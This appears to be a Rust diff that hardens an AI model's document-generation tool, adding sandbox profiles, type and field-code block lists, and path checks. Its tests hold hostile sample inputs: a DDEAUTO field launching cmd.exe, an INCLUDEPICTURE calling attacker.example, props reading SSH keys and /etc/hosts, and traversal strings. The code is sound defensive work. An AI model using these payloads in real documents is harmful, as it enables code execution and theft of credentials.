@@ -260,6 +260,11 @@ const FOLDER_NAMES: &[&str] = &[
     "boot",
     "srv",
     "run",
+    "sbin",
+    "lib",
+    "cores",
+    "snap",
+    "nix",
 ];
 /// The first segment of an element path, besides a sheet's name.
 const ROOTS: &[&str] = &[
@@ -308,7 +313,7 @@ fn property(key: &str) -> Property {
         Property::Prose
     } else if matches!(last, "gradient" | "background") || last.ends_with("fill") {
         Property::Fill
-    } else if matches!(last, "numberformat" | "format" | "numfmt") {
+    } else if matches!(key.as_str(), "numberformat" | "numfmt") {
         Property::NumberFormat
     } else {
         Property::Other
@@ -367,6 +372,9 @@ fn check_batch(commands: &mut [Value]) -> Result<(), String> {
                 FIELDS.join(", ")
             )));
         }
+        if let Some(why) = refused_shape(fields) {
+            return Err(problem(&why));
+        }
         for (field, value) in fields.iter() {
             let why = if ELEMENT_FIELDS.contains(&field.as_str()) {
                 let anchor = matches!(field.as_str(), "after" | "before");
@@ -386,10 +394,7 @@ fn check_batch(commands: &mut [Value]) -> Result<(), String> {
                 return Err(problem(&format!("\"{key}\" {why}")));
             }
         }
-        let kind = fields
-            .get("type")
-            .and_then(Value::as_str)
-            .unwrap_or_default();
+        let kind = element_type(fields);
         let name = fields
             .get("props")
             .and_then(|props| props.get("name"))
@@ -400,19 +405,106 @@ fn check_batch(commands: &mut [Value]) -> Result<(), String> {
                 .and_then(Value::as_str)
                 .and_then(|path| path.strip_prefix('/'))
                 .is_some_and(|sheet| sheets.contains(&sheet.to_lowercase()));
-        let added = verb == "add" && kind.eq_ignore_ascii_case("sheet");
+        let added = verb == "add" && kind == "sheet";
         if let Some(name) = name.filter(|name| (renamed || added) && may_root(name)) {
             sheets.push(name.to_lowercase());
         }
-        let diagram = kind.eq_ignore_ascii_case("diagram");
-        if verb == "add" && diagram {
-            let props = fields.entry("props").or_insert_with(|| json!({}));
-            if let Some(props) = props.as_object_mut() {
-                props.insert("render".into(), json!("native"));
-            }
-        }
     }
     Ok(())
+}
+
+/// Element types a batch may not add: a diagram (officecli renders it in a
+/// browser it starts, with mermaid.js from the network), an embedded
+/// object or package (an executable inside the document).
+const REFUSED_TYPES: &[&str] = &[
+    "diagram",
+    "flowchart",
+    "ole",
+    "oleobject",
+    "object",
+    "embed",
+    "package",
+];
+/// The Word fields a document may hold: they show a number or a date, and
+/// run nothing.
+const FIELD_NAMES: &[&str] = &["page", "numpages", "date", "time", "toc"];
+/// Field instructions that run a program, or fetch a file, when Word opens
+/// the document.
+const FIELD_CODES: &[&str] = &["DDEAUTO", "DDE ", "INCLUDEPICTURE", "INCLUDETEXT"];
+
+/// An item's `type`, as officecli compares it.
+fn element_type(fields: &Map<String, Value>) -> String {
+    fields
+        .get("type")
+        .and_then(Value::as_str)
+        .unwrap_or_default()
+        .trim()
+        .to_ascii_lowercase()
+}
+
+/// Why an item's shape is refused, if it is: a `type` that is not a word,
+/// or one a batch may not add; `props` that are not one object of scalars
+/// with distinct ASCII keys (officecli also takes `["key=value"]` arrays and
+/// keeps the last of two keys that differ in case); a field other than
+/// [`FIELD_NAMES`]; a field instruction of [`FIELD_CODES`] anywhere.
+fn refused_shape(fields: &Map<String, Value>) -> Option<String> {
+    if let Some(kind) = fields.get("type") {
+        let Some(kind) = kind.as_str().filter(|kind| {
+            !kind.is_empty()
+                && kind
+                    .chars()
+                    .all(|c| c.is_ascii_alphanumeric() || "-_".contains(c))
+        }) else {
+            return Some("\"type\" must be an element type such as slide or paragraph".into());
+        };
+        if REFUSED_TYPES.contains(&kind.to_ascii_lowercase().as_str()) {
+            return Some(format!("\"{kind}\" elements cannot be added here"));
+        }
+    }
+    let empty = Map::new();
+    let props = match fields.get("props") {
+        None => &empty,
+        Some(Value::Object(props)) => props,
+        Some(_) => return Some("\"props\" must be an object of property names and values".into()),
+    };
+    let mut seen = std::collections::HashSet::new();
+    for (key, value) in props {
+        if key.is_empty() || !key.is_ascii() {
+            return Some(format!("\"props.{key}\" is not a property name"));
+        }
+        if !seen.insert(key.to_ascii_lowercase()) {
+            return Some(format!("\"props.{key}\" is given twice"));
+        }
+        if value.is_object() || value.is_array() {
+            return Some(format!("\"props.{key}\" must be a single value"));
+        }
+        let text = value.as_str().unwrap_or_default().to_ascii_uppercase();
+        if FIELD_CODES.iter().any(|code| text.contains(code)) {
+            return Some(format!(
+                "\"props.{key}\" holds a field instruction that runs or fetches something"
+            ));
+        }
+    }
+    // A field's name, wherever officecli reads one.
+    let field = element_type(fields) == "field";
+    let named: &[&str] = if field {
+        &["instruction", "instr", "code", "field", "fieldtype", "type"]
+    } else {
+        &["instruction", "instr", "field"]
+    };
+    let names: Vec<(&String, &Value)> = props
+        .iter()
+        .filter(|(key, _)| named.contains(&key.to_ascii_lowercase().as_str()))
+        .collect();
+    let allowed = |value: &Value| {
+        value
+            .as_str()
+            .is_some_and(|name| FIELD_NAMES.contains(&name.trim().to_ascii_lowercase().as_str()))
+    };
+    if (field && names.is_empty()) || names.iter().any(|(_, value)| !allowed(value)) {
+        return Some("a field can only be page, numpages, date, time or toc".into());
+    }
+    None
 }
 
 /// The first value under `value` (named `key`, of class `class`) that its
@@ -460,10 +552,15 @@ fn refused_value(text: &str, class: Property) -> Option<&'static str> {
                     .all(|c| c.is_ascii_alphanumeric() || "#,;-. ".contains(c)))
             .then_some("a gradient takes colours only")
         }
-        Property::NumberFormat => {
-            (text.starts_with(['/', '~']) || lower.contains("://") || lower.starts_with("file:"))
-                .then_some(elsewhere)
-        }
+        // `hh:mm`, `[h]:mm:ss`: a colon after date and time codes is no
+        // scheme; every other check holds.
+        Property::NumberFormat => location(text, |token| {
+            is_scheme(token)
+                && !token
+                    .chars()
+                    .all(|c| "hmsdy".contains(c.to_ascii_lowercase()))
+        })
+        .then_some(elsewhere),
         Property::Fill | Property::Other => names_a_location(text).then_some(elsewhere),
     }
 }
@@ -481,6 +578,12 @@ fn is_scheme(name: &str) -> bool {
 /// has a `..` segment, or starts with a drive or a scheme other than
 /// `data:`. A cell range (`E2:L18`) is none.
 fn names_a_location(text: &str) -> bool {
+    location(text, is_scheme)
+}
+
+/// [`names_a_location`], with `scheme` deciding which token before a colon
+/// is a scheme's (or a drive's) name.
+fn location(text: &str, scheme: impl Fn(&str) -> bool) -> bool {
     let path = text.trim().replace('\\', "/");
     let lower = path.to_ascii_lowercase();
     let unsigned = path.strip_prefix('-').unwrap_or(&path);
@@ -488,9 +591,7 @@ fn names_a_location(text: &str) -> bool {
         .strip_prefix('.')
         .unwrap_or(unsigned)
         .starts_with(|c: char| c.is_ascii_digit());
-    let scheme = lower
-        .split_once(':')
-        .is_some_and(|(name, _)| is_scheme(name));
+    let scheme = lower.split_once(':').is_some_and(|(name, _)| scheme(name));
     path.starts_with(['/', '~'])
         || (path.starts_with('.') && !number)
         || path.split('/').any(|part| part.trim() == "..")
@@ -509,17 +610,22 @@ fn data_reaches_out(text: &str) -> bool {
         && bytes[1] == b':'
         && matches!(bytes[2], b'/' | b'\\');
     let single = !text.contains([',', ';', '\n']);
-    text.starts_with(['/', '\\', '~', '.', '@'])
+    // `a,b/../../x` climbs out of the folder too: .NET folds `b/..` away.
+    let climbs = text
+        .replace('\\', "/")
+        .split(['/', ',', ';', '\n', '\r', '\t'])
+        .any(|part| part.trim() == "..");
+    climbs
+        || text.starts_with(['/', '\\', '~', '.', '@'])
         || drive
         || lower
             .split_once("://")
             .is_some_and(|(name, _)| is_scheme(name))
         || lower.starts_with("file:")
         || (single
-            && (lower
+            && lower
                 .split_once(':')
-                .is_some_and(|(name, _)| is_scheme(name))
-                || text.replace('\\', "/").split('/').any(|part| part == "..")))
+                .is_some_and(|(name, _)| is_scheme(name)))
 }
 
 /// One cell: one to three letters and a row number (`B12`).
@@ -711,7 +817,11 @@ fn file_name(raw: &str, format: DocumentFormat) -> String {
     let last = raw.rsplit(['/', '\\']).next().unwrap_or_default();
     let printable: String = last
         .chars()
-        .filter(|c| !c.is_control() && !matches!(c, '<' | '>' | ':' | '"' | '|' | '?' | '*'))
+        .filter(|c| {
+            !c.is_control()
+                && !matches!(c, '<' | '>' | ':' | '"' | '|' | '?' | '*')
+                && !matches!(c, '\u{200B}'..='\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' | '\u{FEFF}')
+        })
         .collect();
     let trimmed = printable
         .trim_start_matches(|c: char| c == '.' || c.is_whitespace())
@@ -929,9 +1039,10 @@ fn write_new(path: &Path, bytes: &[u8]) -> Result<(), String> {
 }
 
 /// Typst looks for packages, and caches downloads, only in `home`'s package
-/// folder (see the runner). Read-only, a download fails loudly instead of
-/// quietly working: the body is already refused when it names a package,
-/// and this stops one it builds at run time.
+/// folder (see the runner), which is read-only: a downloaded package is not
+/// kept. The download itself is stopped by the runner's dead proxy and, on
+/// macOS, by [`TYPST_SANDBOX`]; a body that names a package is refused
+/// before Typst starts.
 fn seal_packages(home: &Path) -> Result<(), String> {
     let packages = home.join(TYPST_PACKAGES);
     crate::config::create_private_dir_all(&packages).map_err(|_| unwritable())?;
@@ -960,19 +1071,76 @@ struct Work<'a> {
     home: &'a Path,
     /// How the model knows the engine.
     name: &'static str,
-    /// `sandbox-exec`, to run the engine under [`OFFICE_SANDBOX`].
+    /// `sandbox-exec`, to run the engine under `profile`.
     sandbox: Option<&'a Path>,
+    /// [`OFFICE_SANDBOX`] or [`TYPST_SANDBOX`].
+    profile: &'static str,
+    /// Where officecli keeps its own temporary files (see
+    /// [`officecli_scratch`]); the profile lets it write there.
+    scratch: Option<&'a Path>,
 }
 
-/// What officecli may do on macOS: no network, and of the user's folders
-/// (`/Users`, `/Volumes`) only the document's own and the engine's. File
+/// What officecli may do on macOS: no network; of the user's folders
+/// (`/Users`, `/Volumes`) read only the document's own and the engine's;
+/// write only the document's folder and its own temporary folder. File
 /// names and sizes stay readable, so that paths resolve.
 const OFFICE_SANDBOX: &str = r#"(version 1)
 (allow default)
 (deny network*)
-(deny file-read-data file-write* (subpath "/Users") (subpath "/Volumes"))
+(deny file-read-data (subpath "/Users") (subpath "/Volumes"))
+(deny file-write*)
+(allow file-write* (literal "/dev/null") (literal "/dev/zero") (literal "/dev/dtracehelper") (regex #"^/dev/tty"))
 (allow file-read-data file-write* (subpath (param "DOC")))
+(allow file-read-data file-write* (subpath (param "SCRATCH")))
 (allow file-read-data (subpath (param "ENGINE")))"#;
+
+/// What Typst may do on macOS: anything but the network. It reads system
+/// and user fonts; `--root` keeps the body to the document's folder.
+const TYPST_SANDBOX: &str = r#"(version 1)
+(allow default)
+(deny network*)"#;
+
+/// `/tmp/officecli-<uid>`, where officecli keeps temporary files whatever
+/// `TMPDIR` says: created private, refused when it is someone else's or a
+/// link.
+#[cfg(unix)]
+fn officecli_scratch() -> Result<PathBuf, String> {
+    use std::os::unix::fs::{DirBuilderExt, MetadataExt};
+    let unsafe_folder = || {
+        refuse(
+            FAILED,
+            "officecli's temporary folder is not a private folder",
+        )
+    };
+    // SAFETY: getuid has no preconditions and cannot fail.
+    let uid = unsafe { libc::getuid() };
+    let path = PathBuf::from(format!("/tmp/officecli-{uid}"));
+    match std::fs::DirBuilder::new().mode(0o700).create(&path) {
+        Ok(()) => {}
+        Err(error) if error.kind() == std::io::ErrorKind::AlreadyExists => {}
+        Err(_) => return Err(unsafe_folder()),
+    }
+    let meta = std::fs::symlink_metadata(&path).map_err(|_| unsafe_folder())?;
+    if !meta.is_dir() || meta.uid() != uid {
+        return Err(unsafe_folder());
+    }
+    path.canonicalize().map_err(|_| unsafe_folder())
+}
+
+#[cfg(not(unix))]
+fn officecli_scratch() -> Result<PathBuf, String> {
+    Err(refuse(FAILED, "officecli has no sandbox here"))
+}
+
+/// An absolute path outside the document's folder in engine text: a drive,
+/// a share, or one under a file system's own first folder. Element paths
+/// (`/slide[1]`) are not among them.
+static OUTSIDE_PATH: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
+    regex::Regex::new(
+        r#"(?i)(?P<lead>^|[\s'"(=,:\[`])(?:[a-z]:[\\/]|\\\\|/(?:users|volumes|private|var|tmp|home|root|etc|opt|usr|applications|library|system|windows|programdata|mnt|media|dev|proc|sys|srv|run|snap|nix|sbin|bin|lib|cores|boot)\b)[^\s'"`<>|]*"#,
+    )
+    .expect("a valid pattern")
+});
 
 /// `path` as the sandbox matches it: with its links resolved.
 fn real(path: &Path) -> String {
@@ -989,9 +1157,20 @@ impl Work<'_> {
                 let doc = format!("DOC={}", real(self.dir));
                 let real_exe = PathBuf::from(real(self.exe));
                 let engine = format!("ENGINE={}", real(real_exe.parent().unwrap_or(&real_exe)));
+                let scratch = format!("SCRATCH={}", real(self.scratch.unwrap_or(self.dir)));
                 let exe = self.exe.to_string_lossy();
                 let wrapped = [
-                    &["-D", &doc, "-D", &engine, "-p", OFFICE_SANDBOX, &exe][..],
+                    &[
+                        "-D",
+                        &doc,
+                        "-D",
+                        &engine,
+                        "-D",
+                        &scratch,
+                        "-p",
+                        self.profile,
+                        &exe,
+                    ][..],
                     args,
                 ]
                 .concat();
@@ -1046,6 +1225,7 @@ impl Work<'_> {
                 .replace(&format!("{folder}{}", std::path::MAIN_SEPARATOR), "")
                 .replace(folder.as_str(), ".");
         }
+        let text = OUTSIDE_PATH.replace_all(&text, "${lead}<path>");
         crate::redact::scrub(&text).into_owned()
     }
 
@@ -1430,6 +1610,7 @@ fn typst_failure(work: &Work<'_>, stderr: &str, body: &str) -> String {
         .filter(|line| !line.trim().is_empty())
         .filter_map(|line| match diagnostic(line) {
             Some(d) if d.severity == "warning" => None,
+            // Typst's words are scrubbed; the quoted line is the model's own.
             Some(d) => Some(match body_line(d.line) {
                 Some(number) => {
                     let source = body.lines().nth(number - 1).unwrap_or_default().trim();
@@ -1437,15 +1618,14 @@ fn typst_failure(work: &Work<'_>, stderr: &str, body: &str) -> String {
                         "line {number}, column {}: {}: {}\n    {}",
                         d.column,
                         d.severity,
-                        d.message,
+                        work.shown(d.message),
                         clip(source, MAX_PATH_CHARS)
                     )
                 }
-                None => format!("{}: {}", d.severity, d.message),
+                None => format!("{}: {}", d.severity, work.shown(d.message)),
             }),
-            None => Some(line.to_owned()),
+            None => Some(work.shown(line)),
         })
-        .map(|line| work.shown(&line))
         .collect();
     let detail = if said.is_empty() {
         "Typst stopped without saying why".to_owned()
@@ -1520,31 +1700,40 @@ impl AssistantHost {
         made
     }
 
-    /// The `sandbox-exec` officecli runs under: tried once, with
-    /// `--version`. Without it (not macOS, or the probe failed) the batch
-    /// checks alone keep officecli to the document.
-    async fn office_sandbox(&self, work: &Work<'_>) -> Option<PathBuf> {
-        self.office_sandbox
-            .get_or_init(|| async {
-                let sandbox = self.env.sandbox_exec().filter(|path| path.is_file());
-                let Some(sandbox) = sandbox else {
-                    log::warn!("[Assistant] sandbox-exec is unavailable; officecli runs without it");
-                    return None;
-                };
-                let probe = Work {
-                    sandbox: Some(&sandbox),
-                    ..*work
-                };
-                match probe.run(&["--version"]).await {
-                    Ok(output) if output.status == Some(0) => Some(sandbox),
-                    _ => {
-                        log::warn!("[Assistant] officecli does not run under sandbox-exec; it runs without it");
-                        None
-                    }
+    /// The `sandbox-exec` an engine runs under: tried once per engine, with
+    /// `--version` under its profile. Without it (not macOS, or the probe
+    /// failed) the batch checks and the dead proxy alone hold the engine.
+    async fn engine_sandbox(
+        &self,
+        cell: &tokio::sync::OnceCell<Option<PathBuf>>,
+        work: &Work<'_>,
+    ) -> Option<PathBuf> {
+        cell.get_or_init(|| async {
+            let sandbox = self.env.sandbox_exec().filter(|path| path.is_file());
+            let Some(sandbox) = sandbox else {
+                log::warn!(
+                    "[Assistant] sandbox-exec is unavailable; {} runs without it",
+                    work.name
+                );
+                return None;
+            };
+            let probe = Work {
+                sandbox: Some(&sandbox),
+                ..*work
+            };
+            match probe.run(&["--version"]).await {
+                Ok(output) if output.status == Some(0) => Some(sandbox),
+                _ => {
+                    log::warn!(
+                        "[Assistant] {} does not run under sandbox-exec; it runs without it",
+                        work.name
+                    );
+                    None
                 }
-            })
-            .await
-            .clone()
+            }
+        })
+        .await
+        .clone()
     }
 
     async fn make_document(
@@ -1566,25 +1755,35 @@ impl AssistantHost {
         let format = document.format;
         let made = match (format.engine(), engine.as_deref(), &document.content) {
             (Engine::Office, Some(exe), _) => {
+                let scratch = match self.env.sandbox_exec() {
+                    Some(_) => Some(blocking(officecli_scratch).await?),
+                    None => None,
+                };
                 let mut work = Work {
                     exe,
                     dir: &dir,
                     home: &home,
                     name: "officecli",
                     sandbox: None,
+                    profile: OFFICE_SANDBOX,
+                    scratch: scratch.as_deref(),
                 };
-                let sandbox = self.office_sandbox(&work).await;
+                let sandbox = self.engine_sandbox(&self.office_sandbox, &work).await;
                 work.sandbox = sandbox.as_deref();
                 make_office(&work, format).await?
             }
             (Engine::Typst, Some(exe), Content::Text(body)) => {
-                let work = Work {
+                let mut work = Work {
                     exe,
                     dir: &dir,
                     home: &home,
                     name: "Typst",
                     sandbox: None,
+                    profile: TYPST_SANDBOX,
+                    scratch: None,
                 };
+                let sandbox = self.engine_sandbox(&self.typst_sandbox, &work).await;
+                work.sandbox = sandbox.as_deref();
                 make_pdf(&work, body).await?
             }
             (Engine::Text, _, _) => Made {
@@ -2536,11 +2735,11 @@ esac"#,
                 .find(|error| error.contains(needle))
                 .unwrap_or_else(|| panic!("no refusal names {needle}"))
         };
-        at("\"props.fill.image.src\" must be a data: URI");
+        at("\"props.fill\" must be a single value");
         at("\"props.link\" must be an https:, http: or mailto: address, or slide[n]");
         at("\"props.fill.image\" must be a data: URI");
         at("\"props.subtitle\" names a file or an address");
-        at("\"props.styles[1]\" names a file or an address");
+        at("\"props.styles\" must be a single value");
         at("\"props.background\" may name an image only as a data: URI");
         at("\"props.data\" must be the table's rows inline");
         at("\"from\" must name an element of the document");
@@ -2561,7 +2760,6 @@ esac"#,
         );
         let content = json!([
             {"command": "add", "parent": "/slide[1]", "type": "picture", "props": {"src": "data:image/png;base64,iVBORw0KGgo=", "alt": "Logo", "link": "https://example.com"}},
-            {"command": "add", "parent": "/slide[1]", "type": "diagram", "props": {"text": "graph TD; A-->B"}},
             {"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"text": "see https://example.com and a/b", "title": "MS-DOS: C:\\ and /usr/bin", "notes": "~/draft, ../old", "hyperlink": "mailto:team@example.com", "background": "FF0000-0000FF-90", "fill": "accent1"}},
             {"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"link": "slide[3]", "text": "Next"}},
             {"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"link": "/slide[3]", "text": "Next"}},
@@ -2590,10 +2788,7 @@ esac"#,
         let seen: Value =
             serde_json::from_slice(&std::fs::read(file.with_file_name("batch-seen.json")).unwrap())
                 .unwrap();
-        // A diagram is drawn with shapes, never by a browser.
-        assert_eq!(seen[1]["props"]["render"], "native");
-        assert_eq!(seen[0], content[0]);
-        assert_eq!(seen[3], content[3]);
+        assert_eq!(seen, content);
     }
 
     /// Every batch command the bundled office skills teach (a snapshot of
@@ -2705,6 +2900,9 @@ esac"#,
         // A file system's folder name roots nothing, even as a sheet.
         assert!(batch("Users", "/Users/A1").is_err());
         assert!(batch("Program Files", "/Program Files/A1").is_err());
+        for name in ["nix", "snap", "sbin", "lib", "cores"] {
+            assert!(batch(name, &format!("/{name}/A1")).is_err(), "{name}");
+        }
         assert!(batch("Sales", "/Sales/A1:C3").is_ok());
         assert!(batch("Sales", "/Sales/row[2]").is_ok());
         assert!(batch("Sales", "/Sales/chart[1]").is_ok());
@@ -2795,12 +2993,29 @@ esac"#,
             "hh:mm",
             "[h]:mm:ss",
             "yyyy-mm-dd hh:mm",
-            "\\$#,##0",
             "0.00%",
+            "#,##0.00",
         ] {
             assert!(!refused("numberformat", format), "{format}");
             assert!(!refused("numFmt", format), "{format}");
         }
+        // Every other location check holds for them (R41).
+        for format in [
+            "\\$#,##0",
+            "C:\\x",
+            "C:x",
+            "\\\\server\\x",
+            "../x",
+            "/x",
+            "~/x",
+            "file:x",
+            "https://x",
+            "javascript:x",
+        ] {
+            assert!(refused("numberformat", format), "{format}");
+        }
+        // Only those two keys: `format` is like any other.
+        assert!(refused("format", "hh:mm"));
         assert!(refused("format", "file:///x"));
         // Lengths and numbers may start with a dot or a minus; a hidden
         // file may not.
@@ -2810,6 +3025,203 @@ esac"#,
         for value in [".hidden", "./x", "/x", "~x", "C:x", "smb:x"] {
             assert!(refused("x", value), "{value}");
         }
+    }
+
+    /// One batch of `items` after a slide: its checks' answer.
+    fn checked(items: &[Value]) -> Result<(), String> {
+        let mut commands = vec![json!({"command": "add", "parent": "/", "type": "slide"})];
+        commands.extend(items.iter().cloned());
+        check_batch(&mut commands)
+    }
+
+    /// The bypasses a review found against the real officecli (fix round 1):
+    /// each must be refused before officecli runs.
+    #[test]
+    fn props_are_one_object_of_single_values() {
+        for item in [
+            // officecli also takes `["key=value"]` arrays.
+            json!({"command": "add", "parent": "/slide[1]", "type": "table", "props": ["data=/etc/hosts"]}),
+            json!({"command": "add", "parent": "/body", "type": "markdown", "props": ["src=/Users/me/.ssh/id_rsa"]}),
+            json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": ["src=https://evil.example/x.png"]}),
+            json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": ["src=C:\\Users\\me\\.ssh\\id_rsa"]}),
+            json!({"command": "add", "parent": "/slide[1]", "type": "shape", "props": "src=/etc/hosts"}),
+            // Nested objects and arrays.
+            json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": {"image": {"text": "/Users/x/.ssh/id_rsa"}}}),
+            json!({"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"fill": {"image": {"src": "/tmp/x.png"}}}}),
+            json!({"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"text": ["a", "b"]}}),
+            // Keys that differ only in case: officecli keeps the last.
+            json!({"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"text": "x", "Text": "y"}}),
+            json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": {"src": "data:image/png;base64,AAAA", "SRC": "/etc/hosts"}}),
+            // A key .NET folds to `src` (U+017F).
+            json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": {"\u{17f}rc": "x/../y"}}),
+        ] {
+            let error = checked(std::slice::from_ref(&item)).unwrap_err();
+            assert!(error.contains("item 1:"), "{item}: {error}");
+        }
+    }
+
+    #[test]
+    fn diagrams_and_embedded_objects_are_refused() {
+        for kind in [
+            "diagram",
+            "Diagram",
+            "DIAGRAM",
+            "diagram ",
+            " diagram",
+            "flowchart",
+            "FlowChart",
+            "ole",
+            "OLE",
+            "oleobject",
+            "object",
+            "embed",
+            "package",
+            "dia\u{301}gram",
+            "",
+        ] {
+            let error = checked(&[json!({"command": "add", "parent": "/slide[1]", "type": kind, "props": {"mermaid": "flowchart TD; A-->B", "render": "image"}})])
+                .unwrap_err();
+            assert!(error.contains("item 1:"), "{kind:?}: {error}");
+        }
+        // An OLE package, as the review planted one.
+        let error = checked(&[json!({"command": "add", "parent": "/slide[1]", "type": "ole", "props": {"src": "data:application/octet-stream;base64,TVqQAAMAAAAEAAAA", "oleKind": "package", "embedExt": "exe"}})])
+            .unwrap_err();
+        assert!(
+            error.contains("\"ole\" elements cannot be added"),
+            "{error}"
+        );
+        assert!(checked(&[json!({"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"text": "graph"}})]).is_ok());
+    }
+
+    #[test]
+    fn table_data_never_climbs_out_of_the_folder() {
+        for data in [
+            "a,b/../../secret.csv",
+            "a,b\\..\\..\\..\\..\\Users\\x\\.ssh\\id_rsa",
+            "a;b/../../../../../../etc/hosts",
+            "x\n/../../../../../etc/hosts",
+            "x\n../../secret.csv",
+            "x,y\\..\\..\\secret.csv",
+            "x\t..\\secret.csv",
+            "https://127.0.0.1:9/t.csv,extra",
+        ] {
+            let item = json!({"command": "add", "parent": "/slide[1]", "type": "table", "props": {"data": data}});
+            assert!(checked(&[item]).is_err(), "{data:?}");
+        }
+        for data in [
+            "Name,Score\nAlice,90",
+            "a:b,c",
+            "Q1..Q4,ok",
+            "data:text/csv,a,b",
+        ] {
+            let item = json!({"command": "add", "parent": "/slide[1]", "type": "table", "props": {"data": data}});
+            assert!(checked(&[item]).is_ok(), "{data:?}");
+        }
+    }
+
+    #[test]
+    fn word_fields_show_only_page_numbers_and_dates() {
+        let field = |props: Value| json!({"command": "add", "parent": "/body/p[1]", "type": "field", "props": props});
+        for props in [
+            json!({"instruction": " DDEAUTO c:\\windows\\system32\\cmd.exe \"/k calc.exe\" "}),
+            json!({"instr": " INCLUDEPICTURE \"\\\\\\\\attacker.example\\\\s\\\\x.png\" \\d "}),
+            json!({"code": "INCLUDETEXT \"x.docx\""}),
+            json!({"fieldType": "mergefield", "name": "CustomerName"}),
+            json!({"type": "if", "expression": "1 = 1"}),
+            json!({"instruction": "PAGE \\* MERGEFORMAT"}),
+            json!({"format": "yyyy"}),
+        ] {
+            assert!(checked(&[field(props.clone())]).is_err(), "{props}");
+        }
+        for props in [
+            json!({"instruction": "PAGE"}),
+            json!({"fieldType": "numpages"}),
+            json!({"type": "date", "format": "yyyy-MM-dd"}),
+            json!({"code": " time "}),
+            json!({"instr": "TOC"}),
+        ] {
+            assert!(checked(&[field(props.clone())]).is_ok(), "{props}");
+        }
+        // A field code in any property is refused; the skills' footer page
+        // number is fine.
+        for props in [
+            json!({"text": "see DDEAUTO here"}),
+            json!({"text": "x", "field": "includepicture \"\\\\h\\s\""}),
+            json!({"text": "Page ", "field": "dde x"}),
+        ] {
+            let item =
+                json!({"command": "add", "parent": "/body", "type": "paragraph", "props": props});
+            assert!(checked(&[item]).is_err(), "{props}");
+        }
+        let footer = json!({"command": "add", "parent": "/", "type": "footer", "props": {"type": "default", "text": "Page ", "field": "page"}});
+        assert!(checked(&[footer]).is_ok());
+    }
+
+    #[tokio::test]
+    #[serial_test::serial(document_engines)]
+    async fn typst_imports_built_at_run_time_reach_no_network() {
+        // A stand-in Typst that, like the real one, fails to download a
+        // package through the dead proxy, and would otherwise make the file.
+        let script = r#"for a; do last=$a; done
+case " $* " in *" --version "*) echo typst; exit 0 ;; esac
+env > typst-env
+if [ "$HTTPS_PROXY" = http://127.0.0.1:9 ] && [ "$https_proxy" = http://127.0.0.1:9 ]; then
+  echo 'main.typ:10:8: error: failed to download package (https://packages.typst.org/preview/cetz-0.3.4.tar.gz: Connection Failed: Connect error: Connection refused (os error 61))' >&2
+  exit 1
+fi
+printf '%%PDF-1.7 /Type /Page' > "$last""#;
+        let f = fixture_in(None, Some(script), |dir| Some(stub_sandbox(dir, true)));
+        for body in [
+            "#let p = \"@\" + \"preview/cetz:0.3.4\"\n#import p: *",
+            "#import \"\\u{40}preview/cetz:0.3.4\": *",
+        ] {
+            let error = f
+                .call(
+                    &id(),
+                    json!({"name": "r", "format": "pdf", "content": body}),
+                )
+                .await
+                .unwrap_err();
+            assert!(error.contains("failed to download package"), "{error}");
+        }
+        assert!(f.record().attachments.is_empty());
+        assert!(f.outputs().iter().all(|dir| !dir.join("out.pdf").exists()));
+        // Typst ran under its own profile, which denies the network.
+        let log = sandbox_log(&f);
+        assert_eq!(
+            log.iter()
+                .filter(|line| line.ends_with("--version"))
+                .count(),
+            1
+        );
+        let compile = log.iter().find(|line| line.contains(" compile ")).unwrap();
+        assert!(compile.contains("(deny network*)"), "{compile}");
+        assert!(!compile.contains("(deny file-write*)"), "{compile}");
+    }
+
+    #[tokio::test]
+    #[serial_test::serial(document_engines)]
+    async fn engine_text_shows_no_path_outside_the_document() {
+        let f = fixture(
+            None,
+            Some(
+                r#"echo "error: Access to the path '/Users/me/.ssh/id_rsa' is denied; also C:\\Users\\me\\x and /private/var/folders/x/y" >&2; exit 1"#,
+            ),
+        );
+        let error = f
+            .call(
+                "call-1",
+                json!({"name": "r", "format": "pdf", "content": "x"}),
+            )
+            .await
+            .unwrap_err();
+        assert!(
+            !error.contains("/Users/me")
+                && !error.contains("C:\\Users")
+                && !error.contains("/private/var"),
+            "{error}"
+        );
+        assert!(error.contains("'<path>'"), "{error}");
     }
 
     #[test]
@@ -2945,9 +3357,12 @@ esac"#,
         // Of the user's folders only the document's own is readable.
         for rule in [
             "(deny network*)",
-            r#"(deny file-read-data file-write* (subpath "/Users") (subpath "/Volumes"))"#,
+            r#"(deny file-read-data (subpath "/Users") (subpath "/Volumes"))"#,
+            "(deny file-write*)",
             r#"(allow file-read-data file-write* (subpath (param "DOC")))"#,
+            r#"(allow file-read-data file-write* (subpath (param "SCRATCH")))"#,
             &format!("-D DOC={}", dir.display()),
+            &format!("-D SCRATCH={}", officecli_scratch().unwrap().display()),
         ] {
             assert!(batch.contains(rule), "{rule}: {batch}");
         }
@@ -3063,6 +3478,16 @@ exit 1"#
                 "abcd.html",
             ),
             ("", DocumentFormat::Json, "document.json"),
+            (
+                "report\u{202E}fdp.exe",
+                DocumentFormat::Pdf,
+                "reportfdp.pdf",
+            ),
+            (
+                "a\u{200B}b\u{FEFF}\u{2066}.txt",
+                DocumentFormat::Txt,
+                "ab.txt",
+            ),
             ("dir/", DocumentFormat::Json, "document.json"),
         ] {
             assert_eq!(file_name(raw, format), name, "{raw:?}");
@@ -3113,6 +3538,8 @@ exit 1"#
                     "DOC=/nonexistent",
                     "-D",
                     "ENGINE=/nonexistent",
+                    "-D",
+                    "SCRATCH=/nonexistent",
                     "-p",
                     OFFICE_SANDBOX,
                     "/bin/cat",
@@ -3167,6 +3594,21 @@ exit 1"#
             .unwrap_err();
         eprintln!("typst error: {error}");
         assert!(error.contains("line 2, column"), "{error}");
+        // A package import built at run time reaches no network.
+        for body in [
+            "#let p = \"@\" + \"preview/cetz:0.3.4\"\n#import p: *",
